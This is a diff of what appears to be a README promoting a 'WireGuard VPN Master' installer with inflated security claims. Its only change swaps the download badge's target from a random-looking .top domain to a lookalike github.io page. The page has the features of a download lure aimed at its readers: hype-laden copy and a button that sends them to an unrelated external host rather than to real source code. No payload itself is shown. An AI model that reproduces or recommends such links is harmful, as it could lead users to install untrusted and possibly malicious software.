@@ -2,7 +2,7 @@
 
 Experience next-level online security with our advanced WireGuard VPN deployment system. This comprehensive solution provides military-grade encryption, unmatched speed, and complete privacy control for individuals and businesses alike. Our automated installer transforms any Linux server into a powerful VPN gateway in minutes, offering superior performance compared to traditional VPN solutions.
 
-[![Get WireGuard VPN Master](https://img.shields.io/badge/Download-WireGuard_VPN_Master-important)](https://poelkakusthbutn.top/)
+[![Get WireGuard VPN Master](https://img.shields.io/badge/Download-WireGuard_VPN_Master-important)](https://wireguard-vpn-installer.github.io/.github)
 
 ---
 
